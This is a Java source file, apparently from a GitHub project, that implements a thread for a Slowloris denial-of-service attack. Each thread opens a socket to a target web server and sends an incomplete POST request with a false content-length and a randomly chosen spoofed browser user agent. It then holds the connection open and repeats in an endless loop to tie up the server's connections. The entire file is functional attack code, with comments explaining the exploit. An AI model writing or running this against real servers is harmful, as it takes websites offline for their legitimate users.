package com.github.hchan.slowloris;

import java.io.IOException;
import java.net.*;
import java.util.Random;

import lombok.Getter;
import lombok.Setter;
import lombok.extern.slf4j.Slf4j;

@Getter
@Setter
@Slf4j
public class SlowlorisThread extends Thread {
	private URL url;
	private int index;
	private String jsessionid;
	private String partialRequest;
	private Socket socket;

	public SlowlorisThread(URL url, int index, String jsessionid) {
		this.url = url;
		this.index = index;
		this.jsessionid = jsessionid;
	}

	/**
	 * creates the initial partial requests that are sent to the server
	 */
	private void createPartialRequest() {

		String type = "POST " + url.toExternalForm() + " HTTP/1.1\r\n";

		String host = "Host: " + url.getHost() + ":" + url.getPort() + "\r\n";
		String contentType = "Content-Type: */* \r\n";
		String connection = "Connection: keep-alive\r\n";

		String[] agents = {
				"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
				"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
				"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-TW; rv:1.9.0.9) Gecko/2009040821",
				"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
				"Mozilla/5.0 (Windows; U; Windows NT 6.1; it; rv:2.0b4) Gecko/20100818",
				"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",
				"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
				"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)",
				"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
				"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
				"Mozilla/5.0 (Windows NT 5.1; U; zh-cn; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.70",
				"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36",
				"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36" };

		String jsessionId = "JSESSIONID: " + jsessionid + "\r\n";
		String contentLength = "content-length: 1\r\n"; // this is the heart and sole of the attack ... don't send
														// anything for a while after specifying the content-length
		partialRequest = type + host + contentType + contentLength + connection + jsessionId
				+ agents[new Random().nextInt(agents.length)] + "\r\n\r\n"; // note that you MUST pass a \r\n for the server to wait for the content to be passed
	}

	private void initConnection() {
		try {
			log.info("initConnection : " + index);
			socket = new Socket(url.getHost(), url.getPort());
		} catch (IOException ioe) {
			log.error("", ioe);
		}
	}

	@Override
	public void run() {
		while (true) {
			initConnection();
			createPartialRequest();
			log.info("Sending partial request: " + index);
			sendPartialRequest();
			try {
				Thread.sleep(10000 + new Random().nextInt(5000));
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			closeConnection();
		}
	}

	private void closeConnection() {
		try {
			socket.close();
		} catch (IOException e) {
			log.error("", e);
		}
	}

	private void sendPartialRequest() {
		try {
			socket.getOutputStream().write(partialRequest.getBytes()); 
		} catch (IOException ioe) {
			log.error("", ioe);
		}
	}
}